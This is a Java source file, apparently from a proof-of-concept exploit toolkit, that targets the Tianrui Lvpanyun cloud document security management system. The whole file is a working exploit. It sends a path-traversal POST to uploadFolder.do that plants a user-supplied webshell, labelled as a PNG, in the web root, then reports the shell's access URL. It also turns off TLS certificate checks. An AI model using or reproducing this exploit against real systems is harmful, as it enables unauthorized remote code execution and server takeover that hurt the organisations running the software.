package com.httprequest.gui.POC;

import com.httprequest.gui.Utils;
import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TianruiLvpanyunFileUpload {
    
    // 发送天锐绿盘云文档安全管理uploadFolder文件上传请求并返回响应
    public static String sendFileUploadRequest(String baseUrl, String shellContent, String filename) throws Exception {
        // 构建请求URL，天锐绿盘云文档安全管理uploadFolder漏洞利用路径
        String requestUrl = baseUrl + "/lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1";
        String requestMethod = "POST";
        
        URL url = new URL(requestUrl);
        HttpURLConnection connection;
        
        // 如果是HTTPS连接，设置信任所有证书的SSL上下文
        if ("https".equals(url.getProtocol().toLowerCase())) {
            HttpsURLConnection httpsConnection = (HttpsURLConnection) url.openConnection();
            httpsConnection.setSSLSocketFactory(Utils.createAllTrustingSSLContext().getSocketFactory());
            httpsConnection.setHostnameVerifier(Utils.createAllTrustingHostnameVerifier());
            connection = httpsConnection;
        } else {
            connection = (HttpURLConnection) url.openConnection();
        }
        
        // 设置请求方法
        connection.setRequestMethod(requestMethod);
        
        // 设置请求头
        connection.setRequestProperty("Host", Utils.getHostWithPort(url));
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36");
        connection.setRequestProperty("Accept", "*/*");
        connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        connection.setRequestProperty("Connection", "close");
        connection.setDoOutput(true);
        
        // 动态生成符合标准的boundary
        String boundary = "----WebKitFormBoundary" + java.util.UUID.randomUUID().toString().replace("-", "");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        
        // 设置连接和读取超时为20秒
        connection.setConnectTimeout(20000);
        connection.setReadTimeout(20000);
        
        // 构建请求详情
        StringBuilder requestDetails = new StringBuilder();
        // 添加原始请求头
        requestDetails.append("原始请求头:\n");
        requestDetails.append("POST " + url.getFile() + " HTTP/1.1\n");
        requestDetails.append("Host: " + Utils.getHostWithPort(url) + "\n");
        requestDetails.append("User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\n");
        requestDetails.append("Accept-Encoding: gzip, deflate\n");
        requestDetails.append("Accept: */*\n");
        requestDetails.append("Connection: close\n");
        requestDetails.append("Content-Type: multipart/form-data; boundary=" + boundary + "\n\n");
        
        // 构建请求体
        String CRLF = "\r\n";
        
        // 使用用户输入的原始shell内容，不需要base64编码
        byte[] shellBytes = shellContent.getBytes(StandardCharsets.UTF_8);
        
        // 写入请求体到输出流
        try (OutputStream outputStream = connection.getOutputStream()) {
            // 写入表单头部
            StringBuilder formBodyBuilder = new StringBuilder();
            formBodyBuilder.append("--").append(boundary).append(CRLF);
            formBodyBuilder.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(filename).append("\"");
            formBodyBuilder.append(CRLF);
            formBodyBuilder.append("Content-Type: image/png");
            formBodyBuilder.append(CRLF);
            formBodyBuilder.append(CRLF);
            
            outputStream.write(formBodyBuilder.toString().getBytes(StandardCharsets.UTF_8));
            
            // 写入文件内容
            outputStream.write(shellBytes);
            
            // 写入表单尾部，确保正确关闭边界
            outputStream.write((CRLF + "--" + boundary + "--" + CRLF).getBytes(StandardCharsets.UTF_8));
            outputStream.flush();
        }
        
        int responseCode = connection.getResponseCode();
        StringBuilder response = new StringBuilder();
        response.append("响应状态码: " ).append(responseCode).append("\n\n");
        
        // 获取响应头
        response.append("响应头:\n");
        for (int i = 0; ; i++) {
            String key = connection.getHeaderFieldKey(i);
            String value = connection.getHeaderField(i);
            if (key == null && value == null) {
                break;
            }
            response.append(key != null ? key : "Status").append(": " ).append(value).append("\n");
        }
        
        response.append("\n响应体:\n");
        
        // 流式读取响应体并实时显示
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line).append("\n");
            }
        }
        
        // 构建并添加shell访问地址信息
        String shellUrl = baseUrl + "/" + filename;
        response.append("shell访问地址: " + shellUrl + "\n");
        
        // 返回请求详情和响应详情
        return "请求详情:\n" + requestDetails.toString() + "\n响应详情:\n" + response.toString();
    }
}